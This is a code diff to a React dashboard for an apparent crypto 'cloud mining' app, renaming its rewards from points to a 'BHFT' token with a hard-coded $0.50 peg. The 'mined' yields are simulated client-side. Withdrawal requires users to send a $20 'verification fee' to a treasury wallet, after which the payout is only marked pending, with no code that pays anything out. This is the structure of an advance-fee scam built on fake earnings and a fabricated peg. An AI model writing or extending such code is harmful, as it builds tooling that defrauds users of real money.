@@ -1,12 +1,13 @@
 import React, { useState } from 'react';
 import { UserProfile, ALL_TIERS } from '../types';
 import { Zap, ShieldCheck, Clock, ArrowUpRight, AlertCircle, CheckCircle2, Loader2, Sparkles, TrendingUp, Info, X, Flame } from 'lucide-react';
-import { sendBNBTransaction, TREASURY_WALLET } from '../services/web3';
+import { sendBHFTTransaction, TREASURY_WALLET } from '../services/web3';
 import { addTransactionRecord } from '../services/firebase';
 import { ethers } from 'ethers';
 import { motion, AnimatePresence } from 'motion/react';
 import { useInitiativeFeedback } from '../context/InitiativeFeedbackContext';
 import { DailyLoginStreak } from './DailyLoginStreak';
+import { TransactionStatusIndicator } from './TransactionStatusIndicator';
 import { sendPushNotification } from '../services/notifications';
 
 interface DashboardProps {
@@ -32,13 +33,14 @@ export const Dashboard: React.FC<DashboardProps> = ({
 
   // Calculations
   const currentTierInfo = ALL_TIERS.find(t => t.tier === user.currentTier) || ALL_TIERS[0];
-  const dailyPoints = currentTierInfo.pointsPerDay;
-  const hourlyPoints = dailyPoints / 24;
-  const usdValue = (user.totalPoints / 1000) * 0.50; // 1000 pts = $0.50 USD baseline
+  const dailyBHFT = currentTierInfo.bhftPerDay || 0.10;
+  const hourlyBHFT = dailyBHFT / 24;
+  const bhftBalance = user.miningBalance || 0;
+  const usdValue = bhftBalance * 0.50; // Peg: 1 BHFT = $0.50 USD
   const bnbValue = usdValue / bnbPrice;
   
-  const withdrawalThresholdUSD = 50.00; // $50 worth of BNB
-  const verificationFeeUSD = 20.00; // Refined to $20 worth of BNB
+  const withdrawalThresholdUSD = 50.00; // $50 worth of BHFT
+  const verificationFeeUSD = 20.00; // Refined to $20 worth of BHFT / BNB
   const isThresholdMet = usdValue >= withdrawalThresholdUSD;
   const verificationFeeBNB = (verificationFeeUSD / bnbPrice).toFixed(5);
   const withdrawalThresholdBNB = (withdrawalThresholdUSD / bnbPrice).toFixed(5);
@@ -75,39 +77,42 @@ export const Dashboard: React.FC<DashboardProps> = ({
   const minerCycleDurationMs = 24 * 60 * 60 * 1000;
   const isMinerEnded = elapsedMs >= minerCycleDurationMs;
   const effectiveElapsed = Math.min(elapsedMs, minerCycleDurationMs);
-  const accumulatedPoints = (effectiveElapsed / minerCycleDurationMs) * dailyPoints;
+  const accumulatedBHFT = (effectiveElapsed / minerCycleDurationMs) * dailyBHFT;
 
-  // Claim points action
+  // Claim points/BHFT action
   const handleClaimPoints = () => {
     if (!isMinerEnded || isMining) return;
 
     setIsMining(true);
     setTimeout(() => {
-      const earned = accumulatedPoints;
-      const newTotal = user.totalPoints + earned;
+      const earned = accumulatedBHFT;
+      const newBalance = (user.miningBalance || 0) + earned;
+      // Sync totalPoints for backwards compatibility
+      const newTotalPoints = newBalance * 1000;
       const now = new Date().toISOString();
       
       onUpdateUser({
-        totalPoints: newTotal,
-        miningBalanceBNB: (newTotal / 1000) * (0.50 / bnbPrice),
+        miningBalance: newBalance,
+        totalPoints: newTotalPoints,
+        miningBalanceBNB: (newBalance * 0.50) / bnbPrice,
         lastClaimDate: now.split('T')[0],
         minerStartTimestamp: now,
       });
       
       setIsMining(false);
-      setSuccessMessage(`Successfully harvested +${earned.toFixed(7)} points to your mining balance!`);
+      setSuccessMessage(`Successfully harvested +${earned.toFixed(4)} BHFT to your mining balance!`);
       setTimeout(() => setSuccessMessage(null), 4000);
 
       // Trigger glorious Success Animation
       showSuccess({
         initiativeName: 'Cloud Hash Harvest',
         title: 'Mining Yield Harvested!',
-        badge: `+${earned.toLocaleString(undefined, { maximumFractionDigits: 7 })} PTS`,
-        description: `Successfully collected ${earned.toLocaleString(undefined, { maximumFractionDigits: 2 })} mined points from your Tier ${user.currentTier} ASIC cluster to your account balance.`,
+        badge: `+${earned.toFixed(4)} BHFT`,
+        description: `Successfully collected ${earned.toFixed(4)} mined BHFT from your Tier ${user.currentTier} ASIC cluster to your account balance.`,
         details: [
-          { label: 'Active Rig', value: `Tier ${user.currentTier} (${dailyPoints.toLocaleString()} PTS/day)` },
-          { label: 'Total Balance', value: `${newTotal.toLocaleString(undefined, { maximumFractionDigits: 2 })} PTS` },
-          { label: 'Estimated Value', value: `≈ $${((newTotal / 1000) * 0.50).toFixed(2)} USD` },
+          { label: 'Active Rig', value: `Tier ${user.currentTier} (${dailyBHFT.toFixed(2)} BHFT/day)` },
+          { label: 'Total Balance', value: `${newBalance.toFixed(2)} BHFT` },
+          { label: 'Estimated Value', value: `≈ $${(newBalance * 0.50).toFixed(2)} USD` },
         ],
       });
     }, 1000);
@@ -133,16 +138,16 @@ export const Dashboard: React.FC<DashboardProps> = ({
     // If the user is already APPROVED (Verified) and clicks withdraw:
     if (user.withdrawalStatus === 'APPROVED') {
       if (!isThresholdMet) {
-        const err = `Minimum withdrawal threshold is ${withdrawalThresholdBNB} BNB (≈ $${withdrawalThresholdUSD.toFixed(2)} USDT) (You have ${bnbValue.toFixed(5)} BNB)`;
+        const err = `Minimum withdrawal threshold is 100.00 BHFT (≈ $50.00 USD) (You have ${bhftBalance.toFixed(2)} BHFT)`;
         setErrorMessage(err);
         showFailed({
           initiativeName: 'Treasury Settlement',
           title: 'Threshold Incomplete',
-          badge: `${bnbValue.toFixed(5)} / ${withdrawalThresholdBNB} BNB`,
-          description: `Minimum withdrawal threshold is ${withdrawalThresholdBNB} BNB (≈ $${withdrawalThresholdUSD.toFixed(2)} USDT). Keep mining or upgrade your tier to accelerate your daily point accumulation!`,
+          badge: `${bhftBalance.toFixed(2)} / 100.00 BHFT`,
+          description: `Minimum withdrawal threshold is 100.00 BHFT (≈ $50.00 USD). Keep mining or upgrade your tier to accelerate your daily BHFT accumulation!`,
           details: [
-            { label: 'Current Balance', value: `${user.totalPoints.toLocaleString()} PTS (${bnbValue.toFixed(5)} BNB)` },
-            { label: 'Required Threshold', value: `${withdrawalThresholdBNB} BNB (≈ $${withdrawalThresholdUSD.toFixed(2)} USDT)` },
+            { label: 'Current Balance', value: `${bhftBalance.toFixed(2)} BHFT` },
+            { label: 'Required Threshold', value: `100.00 BHFT (≈ $50.00 USD)` },
           ],
         });
         return;
@@ -158,11 +163,11 @@ export const Dashboard: React.FC<DashboardProps> = ({
         showSuccess({
           initiativeName: 'Treasury Settlement',
           title: 'Withdrawal Submitted!',
-          badge: `${bnbValue.toFixed(5)} BNB`,
-          description: `Your withdrawal request for ${bnbValue.toFixed(5)} BNB has been submitted successfully! The treasury team will verify and release it within 24 hours.`,
+          badge: `${bhftBalance.toFixed(2)} BHFT`,
+          description: `Your withdrawal request for ${bhftBalance.toFixed(2)} BHFT has been submitted successfully! The treasury team will verify and release it to yourconnected wallet within 24 hours.`,
           details: [
-            { label: 'Points Settled', value: `${user.totalPoints.toLocaleString()} PTS` },
-            { label: 'Estimated Value', value: `${bnbValue.toFixed(5)} BNB (≈ $${usdValue.toFixed(2)} USDT)` },
+            { label: 'BHFT Settled', value: `${bhftBalance.toFixed(2)} BHFT` },
+            { label: 'Estimated Value', value: `≈ $${usdValue.toFixed(2)} USD` },
             { label: 'KYC Verification', value: 'Already Verified' },
           ],
         });
@@ -188,8 +193,8 @@ export const Dashboard: React.FC<DashboardProps> = ({
         }
       }
 
-      // Send $20 verification fee in BNB to Treasury Wallet
-      const { txHash } = await sendBNBTransaction(signer, verificationFeeUSD, bnbPrice);
+      // Send $20 verification fee as a Token Transfer of BHFT to Treasury Wallet
+      const { txHash, tokenAmountStr } = await sendBHFTTransaction(signer, verificationFeeUSD, bnbPrice);
 
       // Record transaction in audit history
       await addTransactionRecord(user.email || user.walletAddress, {
@@ -205,19 +210,19 @@ export const Dashboard: React.FC<DashboardProps> = ({
         withdrawalStatus: 'PENDING_ADMIN_APPROVAL',
       });
 
-      const confirmedMsg = `Verification fee transaction confirmed on Binance Smart Chain! Hash: ${txHash.substring(0, 10)}... (View on BscScan). Your account verification is submitted.`;
+      const confirmedMsg = `Verification fee token transfer confirmed on Binance Smart Chain! Hash: ${txHash.substring(0, 10)}... (View on BscScan). Your account verification is submitted.`;
       setSuccessMessage(confirmedMsg);
       setIsProcessingTx(false);
 
       showSuccess({
         initiativeName: 'Treasury Verification Fee',
         title: 'Verification Broadcasted!',
-        badge: `${verificationFeeBNB} BNB`,
-        description: `Your one-time ${verificationFeeBNB} BNB (≈ $20.00 USDT) verification fee was confirmed on Binance Smart Chain! Your account KYC is verified and queued for treasury release.`,
+        badge: `${tokenAmountStr} BHFT`,
+        description: `Your one-time ${tokenAmountStr} BHFT (≈ $20.00 USD) verification fee was confirmed as a BEP-20 token transfer on Binance Smart Chain! Your account KYC is verified and queued for treasury release.`,
         txHash: txHash,
         details: [
           { label: 'Network', value: 'Binance Smart Chain (BEP-20)' },
-          { label: 'Fee Paid', value: `${verificationFeeBNB} BNB (≈ $20.00 USDT)` },
+          { label: 'Fee Paid', value: `${tokenAmountStr} BHFT (≈ $20.00 USD)` },
           { label: 'Status', value: 'Pending Treasury Release' },
         ],
       });
@@ -235,7 +240,7 @@ export const Dashboard: React.FC<DashboardProps> = ({
         onAction: () => handleVerifyAndWithdraw(),
         details: [
           { label: 'Network', value: 'Binance Smart Chain (BEP-20)' },
-          { label: 'Required Fee', value: `${verificationFeeBNB} BNB (≈ $20.00 USDT)` },
+          { label: 'Required Fee', value: `40.00 BHFT (≈ $20.00 USD)` },
           { label: 'Treasury Wallet', value: `${TREASURY_WALLET.substring(0, 8)}...` },
         ],
       });
@@ -275,22 +280,22 @@ export const Dashboard: React.FC<DashboardProps> = ({
             <div className="space-y-4 text-xs font-mono">
               <div className="p-3 bg-[#0B0E11] rounded-lg border border-white/5 space-y-1">
                 <p className="text-[#848E9C]">1. Base Reward Formula:</p>
-                <p className="text-[#F3BA2F]">Daily Points = 500 * (2 ^ (Tier - 1))</p>
+                <p className="text-[#F3BA2F]">Daily BHFT = 0.5 * (2 ^ (Tier - 1))</p>
               </div>
 
               <div className="p-3 bg-[#0B0E11] rounded-lg border border-white/5 space-y-1">
                 <p className="text-[#848E9C]">2. Your Current Tier (Tier {user.currentTier}):</p>
-                <p className="text-white">500 * (2 ^ ({user.currentTier} - 1)) = <strong className="text-[#F3BA2F]">{dailyPoints.toLocaleString()} PTS / Day</strong></p>
+                <p className="text-white">0.5 * (2 ^ ({user.currentTier} - 1)) = <strong className="text-[#F3BA2F]">{dailyBHFT.toFixed(2)} BHFT / Day</strong></p>
               </div>
 
               <div className="p-3 bg-[#0B0E11] rounded-lg border border-white/5 space-y-1">
                 <p className="text-[#848E9C]">3. Hourly Generation Rate:</p>
-                <p className="text-white">{dailyPoints.toLocaleString()} / 24 hours = <strong className="text-[#00C087]">{hourlyPoints.toFixed(2)} PTS / Hour</strong></p>
+                <p className="text-white">{dailyBHFT.toFixed(2)} / 24 hours = <strong className="text-[#00C087]">{hourlyBHFT.toFixed(4)} BHFT / Hour</strong></p>
               </div>
 
               <div className="p-3 bg-[#0B0E11] rounded-lg border border-white/5 space-y-1">
                 <p className="text-[#848E9C]">4. USD Equivalent Baseline:</p>
-                <p className="text-white">1,000 Points = $0.50 USD</p>
+                <p className="text-white">1 BHFT = $0.50 USD (Pegged)</p>
               </div>
             </div>
 
@@ -320,7 +325,7 @@ export const Dashboard: React.FC<DashboardProps> = ({
                 {user.currentTier === 1 ? 'NOVICE' : `PRO RIG T${user.currentTier}`}
               </span>
             </div>
-            <p className="text-xs text-[#848E9C] mb-4">Mining Power: {dailyPoints.toLocaleString()} PTS / Day</p>
+            <p className="text-xs text-[#848E9C] mb-4">Mining Power: {dailyBHFT.toFixed(2)} BHFT / Day</p>
             
             {/* Tier Progress Bar */}
             <div className="mb-4">
@@ -367,8 +372,8 @@ export const Dashboard: React.FC<DashboardProps> = ({
               </button>
             </div>
             <div className="space-y-1 text-xs mono">
-              <p className="text-slate-300">Hourly: <strong className="text-[#00C087]">{hourlyPoints.toFixed(1)} PTS/hr</strong></p>
-              <p className="text-slate-300">Daily: <strong className="text-[#F3BA2F]">{dailyPoints.toLocaleString()} PTS</strong></p>
+              <p className="text-slate-300">Hourly: <strong className="text-[#00C087]">{hourlyBHFT.toFixed(4)} BHFT/hr</strong></p>
+              <p className="text-slate-300">Daily: <strong className="text-[#F3BA2F]">{dailyBHFT.toFixed(2)} BHFT</strong></p>
             </div>
           </div>
 
@@ -382,7 +387,7 @@ export const Dashboard: React.FC<DashboardProps> = ({
             </div>
             <div className="flex items-center justify-between text-xs">
               <span className="text-slate-400">Total Bonus:</span>
-              <strong className="text-[#F3BA2F] mono">+{(user.totalStreakPointsClaimed || 0).toLocaleString()} PTS</strong>
+              <strong className="text-[#F3BA2F] mono">+{(user.totalStreakPointsClaimed || 0).toLocaleString()} BHFT</strong>
             </div>
           </div>
         </div>
@@ -434,15 +439,15 @@ export const Dashboard: React.FC<DashboardProps> = ({
             </div>
             <div className="flex items-baseline gap-3">
               <span className="text-4xl lg:text-5xl font-bold mono tracking-tighter text-white">
-                {user.totalPoints.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
+                {bhftBalance.toFixed(2)}
               </span>
-              <span className="text-xl font-semibold text-[#F3BA2F]">PTS</span>
+              <span className="text-xl font-semibold text-[#F3BA2F]">BHFT</span>
             </div>
           </div>
 
           <div className="flex flex-col items-start md:items-end gap-1">
             <div className="flex items-center gap-1.5">
-              <h2 className="text-[#848E9C] text-[10px] font-medium uppercase tracking-wider">Live Accumulated Points</h2>
+              <h2 className="text-[#848E9C] text-[10px] font-medium uppercase tracking-wider">Live Accumulated BHFT</h2>
               <motion.div
                 animate={{ opacity: [0.3, 1, 0.3], scale: [0.8, 1.2, 0.8] }}
                 transition={{ duration: 1, repeat: Infinity, ease: "easeInOut" }}
@@ -457,9 +462,9 @@ export const Dashboard: React.FC<DashboardProps> = ({
               className="flex items-baseline gap-2 bg-[#00C087]/10 px-3 py-1.5 rounded-lg border border-[#00C087]/20"
             >
               <span className="text-2xl font-bold mono text-[#00C087]">
-                +{accumulatedPoints.toFixed(7)}
+                +{accumulatedBHFT.toFixed(6)}
               </span>
-              <span className="text-xs font-semibold text-[#00C087]/80">PTS</span>
+              <span className="text-xs font-semibold text-[#00C087]/80">BHFT</span>
             </motion.div>
           </div>
 
@@ -483,7 +488,7 @@ export const Dashboard: React.FC<DashboardProps> = ({
                 <Clock className="w-4 h-4 text-[#848E9C]" />
               )}
               <span className={isMinerEnded ? 'text-black' : 'text-[#848E9C]'}>
-                {isMinerEnded ? 'Claim Points' : `Claim in ${Math.ceil((minerCycleDurationMs - elapsedMs) / (60 * 60 * 1000))}h`}
+                {isMinerEnded ? 'Claim BHFT' : `Claim in ${Math.ceil((minerCycleDurationMs - elapsedMs) / (60 * 60 * 1000))}h`}
               </span>
             </motion.button>
 
@@ -506,26 +511,29 @@ export const Dashboard: React.FC<DashboardProps> = ({
         {/* Grid Stats */}
         <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
           <div className="p-6 bg-[#2B3139] rounded-lg border border-[rgba(255,255,255,0.08)]">
-            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-1">BNB Equivalent</p>
+            <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-1">BHFT Balance</p>
             <p className="text-3xl font-bold mono mb-1 text-white">
-              {bnbValue.toFixed(5)} <span className="text-sm font-normal text-[#848E9C]">BNB</span>
+              {bhftBalance.toFixed(2)} <span className="text-sm font-normal text-[#848E9C]">BHFT</span>
             </p>
-            <p className="text-xs text-[#848E9C]">≈ ${usdValue.toFixed(2)} USDT</p>
+            <p className="text-xs text-[#848E9C]">≈ ${usdValue.toFixed(2)} USD (Peg: $0.50 / BHFT)</p>
           </div>
 
           <div className="p-6 bg-[#2B3139] rounded-lg border border-[rgba(255,255,255,0.08)]">
             <p className="text-[11px] uppercase tracking-wider text-[#848E9C] mb-1">Minimum Settlement Threshold</p>
             <p className="text-3xl font-bold mono mb-1 text-white">
-              {withdrawalThresholdBNB} <span className="text-sm font-normal text-[#848E9C]">BNB</span>
+              100.00 <span className="text-sm font-normal text-[#848E9C]">BHFT</span>
             </p>
             <p className={`text-xs font-medium ${isThresholdMet ? 'text-[#00C087]' : 'text-[#F3BA2F]'}`}>
-              {isThresholdMet ? `Threshold Met: ${withdrawalThresholdBNB} BNB Minimum` : `Need ${((withdrawalThresholdUSD - usdValue) / bnbPrice).toFixed(5)} BNB to reach threshold`}
+              {isThresholdMet ? `Threshold Met: 100.00 BHFT Minimum` : `Need ${(100.00 - bhftBalance).toFixed(2)} BHFT to reach threshold`}
             </p>
           </div>
         </div>
 
         {/* Daily Login Streak Component (Firestore-backed) */}
         <DailyLoginStreak user={user} onUpdateUser={onUpdateUser} />
+
+        {/* Live Transaction Confirmation & Progress Tracker */}
+        <TransactionStatusIndicator user={user} bnbPrice={bnbPrice} />
 
         {/* Verification & Withdrawal Box */}
         <div className="bg-[#0B0E11] rounded-xl p-6 lg:p-8 border border-[#F3BA2F]/20 relative overflow-hidden">
@@ -581,11 +589,11 @@ export const Dashboard: React.FC<DashboardProps> = ({
                 ) : user.withdrawalStatus === 'APPROVED' ? (
                   isThresholdMet ? (
                     <>
-                      <span>Withdraw Mined Points ({bnbValue.toFixed(5)} BNB)</span>
+                      <span>Withdraw Mined BHFT ({bhftBalance.toFixed(2)} BHFT)</span>
                     </>
                   ) : (
                     <>
-                      <span>Verified (Need {withdrawalThresholdBNB} BNB threshold)</span>
+                      <span>Verified (Need 100.00 BHFT threshold)</span>
                     </>
                   )
                 ) : user.withdrawalStatus === 'PENDING_ADMIN_APPROVAL' ? (
@@ -640,7 +648,7 @@ export const Dashboard: React.FC<DashboardProps> = ({
                   <p className="text-white">MINING_CLAIM_SUCCESS</p>
                   <p className="text-[#848E9C]">{new Date().toLocaleDateString()}</p>
                 </div>
-                <span className="text-[#00C087]">+{dailyPoints * 0.25}</span>
+                <span className="text-[#00C087]">+{((dailyBHFT || 0.10) * 0.25).toFixed(4)} BHFT</span>
               </div>
               <div className="flex justify-between items-start opacity-70">
                 <div>
@@ -654,7 +662,7 @@ export const Dashboard: React.FC<DashboardProps> = ({
                   <p className="text-white">ACCOUNT_INITIALIZED</p>
                   <p className="text-[#848E9C]">Fresh Start (Tier 1)</p>
                 </div>
-                <span className="text-[#00C087]">0.0 PTS</span>
+                <span className="text-[#00C087]">0.00 BHFT</span>
               </div>
             </div>
           </div>
